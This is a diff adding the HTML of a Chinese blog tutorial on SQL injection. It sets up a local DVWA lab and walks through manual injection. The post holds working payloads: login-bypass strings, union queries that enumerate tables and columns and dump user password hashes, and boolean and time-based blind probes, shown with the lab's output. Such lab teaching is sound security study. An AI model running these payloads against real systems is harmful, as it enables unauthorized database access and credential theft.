@@ -1,0 +1,1411 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Dr.626">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一款由Python开发的用来检测和利用SQL注入漏洞的免费开源工具，支持多种数据库，例如MySQL、Oracle、PostgreSQL等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLMap 的使用">
+<meta property="og:url" content="https://stitch-top.github.io/2025/12/22/ce-shi-gong-ju/tt08-sqlmap/tt01-sqlmap-de-shi-yong/index.html">
+<meta property="og:site_name" content="Dr.626">
+<meta property="og:description" content="一款由Python开发的用来检测和利用SQL注入漏洞的免费开源工具，支持多种数据库，例如MySQL、Oracle、PostgreSQL等。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://stitch-top.github.io/img/ThemeMap/8576352388.jpg">
+<meta property="article:published_time" content="2025-12-22T13:30:00.000Z">
+<meta property="article:modified_time" content="2026-03-10T02:35:59.651Z">
+<meta property="article:author" content="Dr.626">
+<meta property="article:tag" content="目标URL">
+<meta property="article:tag" content="注入点">
+<meta property="article:tag" content="字段数">
+<meta property="article:tag" content="联合查询">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://stitch-top.github.io/img/ThemeMap/8576352388.jpg">
+  
+  
+  
+  <title>SQLMap 的使用 - Dr.626</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"stitch-top.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"✍"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/load.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Jg3BjUa3RtnEFSREy3wsmUR5-MdYXbMMI","app_key":"DwsEb5BeMxwdz0CEJ6MUBdu3","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dr.626</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-code"></i>
+                实验室
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/tagsnet">
+                    <i class="iconfont icon-bookmark"></i>
+                    文章关系网
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/laboratory/plugin">
+                    <i class="iconfont icon-bug"></i>
+                    Hexo小组件
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/back-1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SQLMap 的使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    <!-- 作者 -->
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Dr.626
+      </span>
+    
+    <!-- 日期 -->
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-22 21:30" pubdate>
+          2025年12月22日 21:30:00
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    <!-- 字数统计 -->
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          35k 字
+        
+      </span>
+    
+
+    <!-- 阅读时长 -->
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          289 分钟
+        
+      </span>
+    
+
+    <!-- 阅读量 -->
+    
+    
+      
+        <span id="goatcounter-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="goatcounter-value"></span> 次
+        </span>
+
+        <script>
+          (function () {
+            // 确保这里的变量名与配置文件一致（这里用 goatcounter_id）
+            var gcCode = 'stitch';
+            if (!gcCode || gcCode === 'undefined') {
+              console.warn('GoatCounter Error: gcCode is missing. Check your _config.fluid.yml');
+              return;
+            }
+            function fetchViews() {
+              var path = window.location.pathname.replace(/\/$/, "");
+              if (path === "") { path = "/"; }
+              var url = 'https://' + gcCode + '.goatcounter.com/counter/' + encodeURIComponent(path) + '.json';
+              console.log('Fetching GoatCounter views from:', url); // 调试日志
+              fetch(url)
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                  console.log('GoatCounter Data:', data);           // 调试日志
+                  var count = (data && data.count) ? data.count.replace(/\s/g, "") : "0";
+                  var el = document.getElementById('goatcounter-value');
+                  var container = document.getElementById('goatcounter-container');
+                  if (el && container) {
+                    el.innerText = count;
+                    container.style.display = 'inline';
+                  }
+                })
+                .catch(function(err) { 
+                  console.warn('GoatCounter Fetch Error:', err); 
+                });
+            }
+            // 立即执行
+            fetchViews();
+          })();
+        </script>
+  
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+  
+  <!-- 动态线条背景
+  <script type="text/javascript"
+  color="0 0 255" opacity='1' zIndex="-2" count="200" src="../js/canvas-nest.js">
+  </script> -->
+  
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SQLMap 的使用</h1>
+            
+            <div class="markdown-body">
+              
+              <p>一款由Python开发的用来检测和利用SQL注入漏洞的免费开源工具，支持多种数据库，例如MySQL、Oracle、PostgreSQL等。</p>
+<span id="more"></span>
+
+
+
+<h1 id="1-安装PHPStudy"><a href="#1-安装PHPStudy" class="headerlink" title="1 安装PHPStudy"></a>1 安装PHPStudy</h1><ul>
+<li>安装PHPStudy<ul>
+<li>PHPStudy官网地址为：<a target="_blank" rel="noopener" href="https://old.xp.cn/download.html">https://old.xp.cn/download.html</a>。</li>
+<li>下载 &gt; 安装 &gt; 启动 &gt; 首页 &gt; 启动Apache和MySQL服务。</li>
+</ul>
+</li>
+</ul>
+<h1 id="2-搭建DVWA靶场"><a href="#2-搭建DVWA靶场" class="headerlink" title="2 搭建DVWA靶场"></a>2 搭建DVWA靶场</h1><ul>
+<li>搭建DVWA靶场<ul>
+<li>DVWA：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kHTjTi2KRxy4iJ5XIqOQFQ?pwd=6inn">https://pan.baidu.com/s/1kHTjTi2KRxy4iJ5XIqOQFQ?pwd=6inn</a>。</li>
+<li>下载 &gt; 解压 &gt; 将整个DVWA文件夹全剪贴到PHPStudy路径的WWW目录下．</li>
+<li>进入<code>...\WWW\DVWA\config</code>目录，备份名为<code>config.inc.php.dist</code>的文件．</li>
+<li>打开文件，修改数据库密码，去掉<code>.dist</code>后缀名，变成<code>config.inc.php</code>．</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$_DVWA</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;db_server&#x27;</span> ]   = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;db_database&#x27;</span> ] = <span class="hljs-string">&#x27;dvwa&#x27;</span>;<br><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;db_user&#x27;</span> ]     = <span class="hljs-string">&#x27;dvwa&#x27;</span>;<br><span class="hljs-comment">// 修改密码</span><br><span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;db_password&#x27;</span> ] = <span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-1-数据库"><a href="#2-1-数据库" class="headerlink" title="2-1 数据库"></a>2-1 数据库</h2><ul>
+<li>数据库<ul>
+<li>打开PHPStudy &gt; 数据库 &gt; 右侧<code>root</code> &gt; 操作 &gt; 修改密码为<code>123456</code>。</li>
+<li>创建数据库 &gt; 数据库名称为<code>dvwa</code>，用户名为<code>dvwa</code>，密码为<code>123456</code>。</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-2-创建网站"><a href="#2-2-创建网站" class="headerlink" title="2-2 创建网站"></a>2-2 创建网站</h2><ul>
+<li>创建网站<ul>
+<li>切换到网站 &gt; 创建网站 &gt; 域名<code>localhost</code>，协议<code>http</code>，端口<code>81</code>。</li>
+<li>根目录为<code>\WWW\DVWA</code>的全路径 &gt; 点击确认 &gt; 等待Apache服务重启。</li>
+<li>点击网站右侧的管理 &gt; 打开网站 &gt; 自动跳转到浏览器的网站登录页。</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-3-修改密钥"><a href="#2-3-修改密钥" class="headerlink" title="2-3 修改密钥"></a>2-3 修改密钥</h2><ul>
+<li>修改密钥<ul>
+<li>默认用户名<code>admin</code>，密码<code>password</code> &gt; 打开<code>\WWW\DVWA\config</code>。</li>
+<li>自定义<code>config.inc.php</code>文件的公钥<code>recaptcha_public_key</code> &gt; 保存。</li>
+<li>自定义<code>config.inc.php</code>文件的私钥<code>recaptcha_private_key</code> &gt; 保存。</li>
+<li>回到浏览器登录页 &gt; 登录 &gt; 点击底部<code>Create/Reset Database</code>按钮。</li>
+<li>等待页面重新跳转回登录页 &gt; 再次登录 &gt; 成功 &gt; DVWA靶场部署完成。</li>
+</ul>
+</li>
+</ul>
+<h1 id="3-SQL注入的原理"><a href="#3-SQL注入的原理" class="headerlink" title="3 SQL注入的原理"></a>3 SQL注入的原理</h1><ul>
+<li>SQL注入的原理<ul>
+<li>本质：用户输入的数据，被作为SQL语句的一部分执行了。</li>
+<li>常见注入漏洞点<ul>
+<li>登录页的用户名、密码输入框。</li>
+<li>输入关键词进行查询的搜索框。</li>
+<li>URL参数：如<code>http://x.com/article?id=1</code>，后台可能依据id参数拼接SQL。</li>
+<li>表单提交：用户输入的内容被存入数据库，如果未被过滤，则可能存在注入。</li>
+</ul>
+</li>
+<li>判断是否存在注入<ul>
+<li>输入框输入单引号<code>&#39;</code>，页面出现SQL语法错误，大概率存在注入。</li>
+<li>若页面显示正常，也可能存在盲注(程序不会直接返回查询数据)。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 正常情况下的登录页，由用户输入用户名和密码进行登录，后台<span class="hljs-keyword">SQL</span>语句正常执行<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;用户输入&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;用户输入&#x27;</span>;<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 若用户输入恶意内容，后台程序未对输入数据过滤或转义，将被当成<span class="hljs-keyword">SQL</span>语句执行<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--&#x27; and password=&#x27;任意输入&#x27;;</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 用户输入了<span class="hljs-string">&#x27; or 1=1--，其中--在SQL中代表注释，上述SQL语句等价于</span><br><span class="hljs-string">select * from user where username=&#x27;&#x27; or 1=1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="4-手工注入的实操"><a href="#4-手工注入的实操" class="headerlink" title="4 手工注入的实操"></a>4 手工注入的实操</h1><ul>
+<li>手工注入的实操<ul>
+<li>浏览器打开DVWA &gt; 登录 &gt; DVWA Security &gt; 选Low &gt; Submit。</li>
+<li>将DVWA靶场的安全等级设置为最低Low，方便手工注入复现漏洞。</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-1-万能密码登录"><a href="#4-1-万能密码登录" class="headerlink" title="4-1 万能密码登录"></a>4-1 万能密码登录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 基础注入：Brute Force <span class="hljs-operator">&gt;</span> 用户名输入<span class="hljs-string">&#x27; or 1=1 ，密码随机 &gt; 点击Login</span><br><span class="hljs-string">// MySQL中双减号注释符--有一个非常严格的要求，双减号后面必须紧跟一个空格</span><br><span class="hljs-string">// MYSQL注释用#或--，--后有一个空格，PostgreSQL、Oracle、SQL Server用--</span><br><span class="hljs-string">// 使用万能密码没成功，SQL语法报错了</span><br><span class="hljs-string">You have an error in your SQL syntax; </span><br><span class="hljs-string">check the manual that corresponds to your MySQL server version for the </span><br><span class="hljs-string">right syntax to use near &#x27;</span><span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 尝试使用admin<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">Welcome to the password protected area admin&#x27;</span> #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 改用输入<span class="hljs-string">&#x27; or 1=1 limit 1#，强行让数据库只吐出1行数据</span><br><span class="hljs-string">Welcome to the password protected area &#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-2-联合查询注入"><a href="#4-2-联合查询注入" class="headerlink" title="4-2 联合查询注入"></a>4-2 联合查询注入</h2><ul>
+<li>联合查询注入<ul>
+<li>核心：利用<code>union select</code>语句，拼接查询语句来获取数据库名、表名等。</li>
+<li>获取到的URL地址不仅仅是攻击目标地址，而且揭示了以下四个关键信息。</li>
+<li>确定注入点<ul>
+<li>明确哪个参数与数据库交互，这里URL参数是<code>id</code>。</li>
+<li>猜测执行类似于<code>select ... where id=&#39;&#39;</code>的语句。</li>
+<li>所有的注入脚本Payload都必须紧跟在<code>id=</code>的后面。</li>
+</ul>
+</li>
+<li>确定数据的提交方式<ul>
+<li>GET：显示在URL中，可直接在浏览器的地址栏中修改参数进行测试。</li>
+<li>POST：不显示在URL中，参数在请求体里，需用F12等工具拦截修改。</li>
+</ul>
+</li>
+<li>找回正常响应的基准：即判断字段数。</li>
+<li>分析SQL的闭合方式：Payload的组合。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">SQL</span> Injection <span class="hljs-operator">&gt;</span> 为空点击Submit <span class="hljs-operator">&gt;</span> 查看URL地址变化(获取URL地址至关重要)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> URL地址：http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">81</span><span class="hljs-operator">/</span>vulnerabilities<span class="hljs-operator">/</span>sqli<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>Submit<span class="hljs-operator">=</span>Submit#<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 【判断字段数】：输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1--  &gt; Submit &gt; 如果正常，继续</span><br><span class="hljs-string">// 【判断字段数】：输入1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">--  &gt; Submit &gt; 如果正常，继续</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 【判断字段数】：输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3--  &gt; Submit &gt; 报错，字段3-1，当前表有两字段</span><br><span class="hljs-string">// 拿到当前表字段，后续union注入获取数据库名称、表名、字段名、数据都需依赖该字段</span><br><span class="hljs-string">Unknown column &#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; in &#x27;</span><span class="hljs-keyword">order</span> clause<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">// SQL语法本身对空格不敏感，逗号和字段名等之间的空格会被数据库解析器自动忽略</span><br><span class="hljs-string">// 上面获取到当前表有2列，这里的select 1，数字1纯粹占位，database()放到了第2列</span><br><span class="hljs-string">// 如果直接输入1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database()<span class="hljs-comment">-- ，则会报错，因为列数不等，拒绝执行</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 【获取数据库名称】：输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1, database()--  &gt; Submit</span><br><span class="hljs-string">ID: 1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, database()<span class="hljs-comment">-- </span><br><span class="hljs-keyword">First</span> name: admin<br>Surname: admin<br>ID: <span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1, database()-- </span><br><span class="hljs-string">First name: 1</span><br><span class="hljs-string">Surname: dvwa</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 【获取表名】输入Payload</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, group_concat(table_name) <br>  <span class="hljs-keyword">from</span> information_schema.tables <br>  <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> information_schema.tables：该表存了整个数据库服务器里所有的表名<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> table_name: 字段名，表示表的名称<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> table_schema: 字段名，表示表所属的数据库名<br>Illegal mix <span class="hljs-keyword">of</span> collations <span class="hljs-keyword">for</span> operation <span class="hljs-string">&#x27;UNION&#x27;</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 报错，两个查询结果集的校对规则(<span class="hljs-keyword">collation</span>)不一致<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 即原始查询结果使用的字符集<span class="hljs-operator">/</span>排序规则与information_schema系统表使用的冲突<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 尝试把查出的表名强制转换为另一种校对规则，通常转为latin1、utf8或gbk<br><span class="hljs-string">&#x27; union select 1, convert(group_concat(table_name) using latin1) </span><br><span class="hljs-string">  from information_schema.tables </span><br><span class="hljs-string">  where table_schema = &#x27;</span>dvwa<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">ID: &#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">convert</span> ... <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dvwa&#x27;</span> #<br><span class="hljs-keyword">First</span> name: <span class="hljs-number">1</span><br>Surname: guestbook,users<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 【获取字段名】输入Payload<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1, convert(group_concat(column_name) using latin1) </span><br><span class="hljs-string">  from information_schema.columns </span><br><span class="hljs-string">  where table_name=&#x27;</span>users<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">ID: 1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">convert</span> ... <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> #<br><span class="hljs-keyword">First</span> name: admin<br>Surname: admin<br>ID: <span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1, convert ... where table_name=&#x27;</span>users<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">First name: 1</span><br><span class="hljs-string">Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 【获取数据】输入Payload</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(group_concat(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">using</span> latin1), <br>  <span class="hljs-keyword">convert</span>(group_concat(password) <span class="hljs-keyword">using</span> latin1) <span class="hljs-keyword">from</span> users #<br>ID: <span class="hljs-number">1</span><span class="hljs-string">&#x27; union select convert(...), convert(...) from users #</span><br><span class="hljs-string">First name: admin</span><br><span class="hljs-string">Surname: admin</span><br><span class="hljs-string">ID: 1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(...), <span class="hljs-keyword">convert</span>(...) <span class="hljs-keyword">from</span> users #<br><span class="hljs-keyword">First</span> name: admin,gordonb,<span class="hljs-number">1337</span>,pablo,smithy<br>Surname: <span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99,...,<span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-3-常见的Payload"><a href="#4-3-常见的Payload" class="headerlink" title="4-3 常见的Payload"></a>4-3 常见的Payload</h2><ul>
+<li>常见的Payload<ul>
+<li>万能密码：<code>&#39; or 1=1-- </code>、<code>&#39; or 1=1 #</code>、<code>&#39; or 1=1 limit 1#</code>、<code>&quot; or 1=1-- </code>等。</li>
+<li>联合查询获取数据库：<code>&#39; union select 1, database()-- </code>。</li>
+<li>布尔盲注(判断是否存在)：<code>&#39; and 1=1-- </code>(正常显示)、<code>&#39; and 1=2-- </code>(报错或不显示)。</li>
+<li>时间盲注(无报错时使用)：<code>&#39; and sleep(5)-- </code>(如果页面延迟5秒加载，说明存在注入)。</li>
+</ul>
+</li>
+</ul>
